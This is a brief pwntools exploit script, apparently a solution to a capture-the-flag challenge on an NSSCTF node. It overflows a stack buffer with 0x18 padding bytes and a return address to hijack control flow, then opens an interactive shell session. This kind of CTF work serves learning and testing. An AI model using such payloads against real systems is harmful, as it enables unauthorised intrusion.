from pwn import *

#io = process("./vuln")
io = remote("node5.anna.nssctf.cn", 25363)

payload = b"a" * (0x10+0x8) + p64(0x40117B)
io.sendline(payload)
io.interactive()
